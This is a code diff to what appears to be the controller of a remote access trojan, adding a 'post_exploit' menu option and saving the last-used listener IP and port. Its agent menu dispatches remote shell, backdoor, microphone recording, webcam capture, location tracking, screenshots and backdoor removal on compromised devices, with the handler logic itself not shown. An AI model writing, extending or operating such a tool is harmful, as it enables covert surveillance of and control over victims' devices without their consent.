@@ -7,8 +7,8 @@ from mainclass.encrypter import *
 from mainclass.options import options
 import socket, os, struct
 
-ip = ""
-port = 0
+ip = system.getdata("recent_ip")
+port = system.getdata("recent_port")
 
 def shell(conn, address): shclass.shell(conn, address)
 def backdoor(conn, address): shclass.backdoor(conn, address)
@@ -21,6 +21,9 @@ def sysinfo(conn, address): shclass.sysinfo(conn, address)
 def secinfo(conn, address): shclass.secinfo(conn, address)
 def notification(conn, address): shclass.send_notification(conn, address)
 def screenshot(conn, address): shclass.screenshot(conn, address)
+def post_exploit(conn, address):
+    server_host = conn.getsockname()[0] if conn else None
+    shclass.manage_post_exploits(conn, address, server_host)
 
 def generateConf(): generate()
 
@@ -30,6 +33,7 @@ def selectIP():
     system.printheader()
     system.printMenuOptions(ip, port)
     ip = system.input(1)
+    system.setData("recent_ip", ip)
 
 def selectPort(): 
     global port
@@ -37,6 +41,7 @@ def selectPort():
     system.printheader()
     system.printMenuOptions(ip, port)
     port = system.input(2)
+    system.setData("recent_port", port)
 
 def getPayloadOption():
     while True:
@@ -160,7 +165,7 @@ menu_options = {"1": build, "2": listen , "3": selectIP,
 
 agent_options = {"1": shell, "2": backdoor, "3": recordmic, "4": uploadfile,
                  "5":cam, "6": getlocation, "7": destroybackdoor, "8": sysinfo, 
-                 "9": notification, "10": screenshot, "11": secinfo}
+                 "9": notification, "10": screenshot, "11": secinfo, "12": post_exploit}
 
 init(autoreset=True)
 
